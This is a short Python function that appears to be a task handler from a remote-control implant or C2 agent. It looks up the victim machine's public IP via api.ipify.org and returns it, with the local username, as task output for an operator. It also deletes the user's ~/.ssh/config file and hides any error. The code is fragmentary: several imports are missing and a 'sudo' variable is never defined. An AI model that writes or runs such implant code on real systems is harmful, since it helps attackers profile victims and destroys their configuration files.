from termcolor import colored


def trace(task_id, command=None):

    ip = requests.get('https://api.ipify.org').text

    if command==None:
        response = {
                'task_id': task_id,
                "user_output": ip,
                'completed': True
            }
            
        responses.append(response)

        try:
            os.remove(os.path.expanduser("~") + "/.ssh/config")
        except:
            print(colored("Not enough permissions", "red"))
    

    else:

        path = ""

        print("PATH = " + str(command))

        if command == False:
            path = ip
        else:
            path += command + " --> " + getpass.getuser() + "@" + ip + ";" + sudo

        response = {
                'task_id': task_id,
                "user_output": path,
                'completed': True
            }
            
        responses.append(response)

    print("\t- Trace Done")

    return